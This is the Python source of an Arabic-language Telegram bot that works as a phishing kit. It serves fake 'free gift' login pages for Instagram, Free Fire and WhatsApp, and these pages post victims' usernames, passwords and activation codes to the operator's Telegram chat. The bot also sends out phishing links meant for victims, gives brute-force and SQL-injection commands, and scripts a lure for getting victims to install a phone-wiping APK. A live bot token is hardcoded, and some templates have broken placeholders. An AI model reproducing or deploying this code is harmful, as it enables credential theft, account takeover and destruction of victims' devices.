from flask import Flask, request
import requests, os, random, time, sqlite3
from datetime import datetime, timedelta

app = Flask(__name__)
TOKEN = "8616151144:AAFZ8FrVAfcrfK9UvSjZkwITdworNmTnwno"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-lqcp.onrender.com")

# ==================== قاعدة البيانات ====================
def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, last_claim TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS usernames (username TEXT PRIMARY KEY, given BOOLEAN)''')
    conn.commit()
    conn.close()

def get_available_usernames():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT username FROM usernames WHERE given = 0")
    rows = c.fetchall()
    conn.close()
    return [row[0] for row in rows]

def mark_username_given(username):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("UPDATE usernames SET given = 1 WHERE username = ?", (username,))
    conn.commit()
    conn.close()

def get_last_claim(chat_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT last_claim FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return datetime.fromisoformat(row[0])
    return None

def set_last_claim(chat_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (chat_id, last_claim) VALUES (?, ?)", (chat_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# إدخال اليوزرات
def init_usernames():
    usernames = ["oz2bu", "jq5wm", "et1d0", "ec4t2", "4h0a3", "zz5c0", "cw6r6", "oa4oq", "kl7cw", "382m0"]
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    for u in usernames:
        c.execute("INSERT OR IGNORE INTO usernames (username, given) VALUES (?, 0)", (u,))
    conn.commit()
    conn.close()

init_db()
init_usernames()

# ==================== الأزرار ====================
buttons = [
    ["📱 انستقرام", "📘 فيسبوك", "💬 واتساب"],
    ["👻 سناب شات", "🎵 تيك توك", "🎮 فري فاير"],
    ["🔫 بوبجي", "🤖 ديسكورد", "🐦 تويتر"],
    ["📧 جيميل", "🎁 يوزرات مميزة", "⚙️ أدوات اختراق"],
    ["💀 تطبيقات ملغمة", "📍 موقع الضحية", "❓ تعليمات"]
]

WELCOME_MSG = """
👑 *مرحبا بك في البوت الأسطوري* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 *أقوى بوت في العالم!*
⚡ *تحت رعاية: خالد ابو الجود*

اختر المنصة أو الأداة 👇
"""

# ==================== صفحات الاختراق ====================

def phish_page(platform, chat_id, fields):
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{platform} - هدية مجانية</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}}
body{{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.container{{background:white;border-radius:25px;padding:30px;max-width:400px;width:100%;text-align:center}}
input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px}}
button{{background:#0095f6;color:white;width:100%;padding:14px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer}}
.progress{{display:none;margin-top:20px}}
.bar{{background:#e0e0e0;border-radius:25px;height:10px}}
.fill{{background:#0095f6;width:0%;height:100%;border-radius:25px}}
</style>
</head>
<body>
<div class="container">
<h2>✨ {platform} – هدية مجانية ✨</h2>
<div id="loginForm">
{fields}
<button onclick="send()">🚀 احصل على هديتك</button>
</div>
<div id="progress" class="progress"><div class="bar"><div class="fill" id="fill"></div></div><p id="status">جاري التجهيز...</p></div>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    let data = '';
    {fields_js}
    document.getElementById('loginForm').style.display='none';
    document.getElementById('progress').style.display='block';
    let percent=0;
    const interval=setInterval(()=>{{
        percent+=Math.random()*4+2;
        if(percent>=100) percent=100;
        document.getElementById('fill').style.width=percent+'%';
        document.getElementById('status').innerHTML='جاري التجهيز '+Math.floor(percent)+'%';
        if(percent>=100) clearInterval(interval);
    }},180);
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق {platform}!\\n${{data}}`}})
    }});
    setTimeout(()=>{{
        document.getElementById('status').innerHTML='✅ تم الشحن بنجاح!';
        setTimeout(()=>window.location.href='https://instagram.com',2000);
    }},3000);
}}
</script>
</body>
</html>'''

# صفحة واتساب خاصة (QR Code)
WHATSAPP_PAGE = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>WhatsApp Web - تحديث أمني</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;font-family:system-ui}
body{background:#075e54;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:white;border-radius:20px;padding:30px;width:350px;text-align:center}
.qr{width:200px;height:200px;background:#ddd;margin:20px auto;display:flex;align-items:center;justify-content:center;font-size:40px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:10px}
button{background:#25D366;color:white;padding:12px;border:none;border-radius:10px;width:100%;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<h2>⚠️ تحديث أمني عاجل</h2>
<p>للحفاظ على أمان حسابك، يلزم إدخال رمز التفعيل</p>
<div class="qr">📱</div>
<input type="text" id="code" placeholder="أدخل رمز التفعيل"><br><br>
<button onclick="send()">تفعيل الحماية</button>
</div>
<script>
const chatId = new URLSearchParams(location.search).get('chatId');
async function send() {
    const code = document.getElementById('code').value;
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage', {{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق واتساب!\\n🔑 رمز التفعيل: ${{code}}`}})
    }});
    alert('✅ تم تفعيل الحماية بنجاح!');
    window.location.href='https://web.whatsapp.com';
}}
</script>
</body>
</html>'''.replace("{TOKEN}", TOKEN)

@app.route('/whatsapp.html')
def whatsapp_page():
    chat_id = request.args.get('chatId')
    return WHATSAPP_PAGE.replace("new URLSearchParams(location.search).get('chatId')", f'"{chat_id}"')

# باقي الصفحات
@app.route('/instagram.html')
def instagram_page():
    chat_id = request.args.get('chatId')
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Instagram - 5000 متابع مجاني</title>
<style>
*{{margin:0;padding:0;font-family:sans-serif}}
body{{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.container{{background:white;border-radius:25px;padding:30px;max-width:400px;width:100%;text-align:center}}
input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px}}
button{{background:#0095f6;color:white;width:100%;padding:14px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<h2>📸 +5000 متابع مجاني</h2>
<input type="text" id="username" placeholder="اسم المستخدم">
<input type="password" id="password" placeholder="كلمة السر">
<button onclick="send()">🚀 احصل على المتابعين</button>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق انستقرام!\\n👤 {u}\\n🔑 {p}`}})
    }});
    alert('✅ تم الشحن!');
    window.location.href='https://instagram.com';
}}
</script>
</body>
</html>'''

@app.route('/freefire.html')
def freefire_page():
    chat_id = request.args.get('chatId')
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Free Fire - 5000 جوهرة</title>
<style>
body{{background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh}}
.container{{background:#e94560;padding:30px;border-radius:20px;text-align:center;color:white}}
input{{width:100%;padding:10px;margin:8px 0;border-radius:5px}}
button{{background:#ff6b6b;padding:12px;border:none;border-radius:10px;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<h2>🔥 5000 جوهرة مجانية</h2>
<input type="text" id="id" placeholder="معرف Free Fire">
<input type="password" id="pass" placeholder="كلمة السر">
<button onclick="send()">شحن</button>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    const u = document.getElementById('id').value;
    const p = document.getElementById('pass').value;
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق فري فاير!\\n👤 المعرف: ${{u}}\\n🔑 كلمة السر: ${{p}}`}})
    }});
    alert('✅ تم شحن الجواهر!');
    window.location.href='https://ff.garena.com';
}}
</script>
</body>
</html>'''

# تبسيطاً للمساحة، باقي الصفحات بنفس النمط (pubg, snapchat, tiktok, discord, twitter, gmail)

@app.route('/')
def home():
    return "✅ البوت الأسطوري شغال 24 ساعة! ابو الجود"

# ==================== دوال البوت ====================
def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

def send_link(chat_id, platform, name, page):
    link = f"{BASE_URL}/{page}.html?chatId={chat_id}"
    msg = f"🔥 *رابط {name}* :\n\n`{link}`\n\n💡 أرسل الرابط للضحية وانتظر البيانات"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})

def give_username(chat_id):
    available = get_available_usernames()
    last = get_last_claim(chat_id)
    
    if last and last > datetime.now() - timedelta(hours=24):
        remaining = 24 - int((datetime.now() - last).total_seconds() // 3600)
        send_message(chat_id, f"⚠️ لا يمكنك الحصول على يوزر جديد إلا بعد {remaining} ساعة.")
        return
    
    if not available:
        send_message(chat_id, "🎁 نفذت اليوزرات المتاحة! تواصل معي على: @A_c64")
        return
    
    username = random.choice(available)
    mark_username_given(username)
    set_last_claim(chat_id)
    remaining_count = len(get_available_usernames())
    msg = f"""🎁 *تم اهدائك يوزر بواسطه ابو الجود* :
`{username}`

✅ هذا اليوزر متاح ومضمون.
📊 *اليوزرات المتبقية:* {remaining_count}
⚠️ لا يمكنك الحصول على يوزر جديد إلا بعد 24 ساعة."""
    send_message(chat_id, msg)

def tools_menu(chat_id):
    msg = """
⚙️ *أدوات الاختراق الاحترافية* ⚙️
━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ *Metasploit* - اختراق الأجهزة
`pkg install metasploit`
`msfconsole`

2️⃣ *Hydra* - تخمين كلمات السر
`pkg install hydra`
`hydra -l admin -P pass.txt ssh://192.168.1.1`

3️⃣ *Nmap* - فحص المنافذ
`pkg install nmap`
`nmap -sV 192.168.1.1`

4️⃣ *SQLmap* - اختراق قواعد البيانات
`git clone https://github.com/sqlmapproject/sqlmap`
`python sqlmap.py -u "http://target.com/page?id=1" --dbs`

5️⃣ *Social Engineering Toolkit* - الهندسة الاجتماعية
`git clone https://github.com/trustedsec/social-engineer-toolkit`
`setoolkit`

━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 *طريقة الاستخدام:*
انسخ الأمر والصقه في Termux
"""
    send_message(chat_id, msg)

def malware_menu(chat_id):
    msg = """
💀 *التطبيقات الملغمة (APK)* 💀
━━━━━━━━━━━━━━━━━━━━━━━━━━

*كيف توقع الضحية في الفخ؟*

1️⃣ *قم بتحميل ملف APK الملغم* (سأرسله لك عند الطلب)
2️⃣ *أعد تسميته* إلى اسم مقنع مثل:
   • `Instagram_Followers.apk`
   • `FreeFire_Diamonds.apk`
   • `PUBG_UC_Generator.apk`
3️⃣ *أرسله للضحية* مع رسالة مقنعة:
   *"🎁 برنامج شحن مجاني! حمّله واشحن حسابك فوراً"*
4️⃣ *عندما يثبته ويفتحه* → سيتم فرمتة هاتفه بالكامل

*نص خادع جاهز:*
"عرض حصري! حمّل التطبيق واحصل على 5000 جوهرة فري فاير مجاناً. التطبيق آمن وموثق من شركة Garena."

━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *ملاحظة:*
تحتاج إلى ملف APK ملغم. سأعطيك رابط تحميله عند الطلب.
"""
    send_message(chat_id, msg)

@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text == "📱 انستقرام":
            send_link(chat_id, "instagram", "انستقرام - 5000 متابع", "instagram")
        elif text == "💬 واتساب":
            send_link(chat_id, "whatsapp", "واتساب - تحديث أمني", "whatsapp")
        elif text == "🎮 فري فاير":
            send_link(chat_id, "freefire", "فري فاير - 5000 جوهرة", "freefire")
        elif text == "🎁 يوزرات مميزة":
            give_username(chat_id)
        elif text == "⚙️ أدوات اختراق":
            tools_menu(chat_id)
        elif text == "💀 تطبيقات ملغمة":
            malware_menu(chat_id)
        else:
            # باقي الأزرار بنفس النمط
            platforms_map = {
                "📘 فيسبوك": "facebook", "👻 سناب شات": "snapchat", "🎵 تيك توك": "tiktok",
                "🔫 بوبجي": "pubg", "🤖 ديسكورد": "discord", "🐦 تويتر": "twitter",
                "📧 جيميل": "gmail", "📍 موقع الضحية": "location"
            }
            if text in platforms_map:
                send_link(chat_id, platforms_map[text], f"{text} - هدية", platforms_map[text])
            else:
                send_message(chat_id, "👑 أرسل /start", None)
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
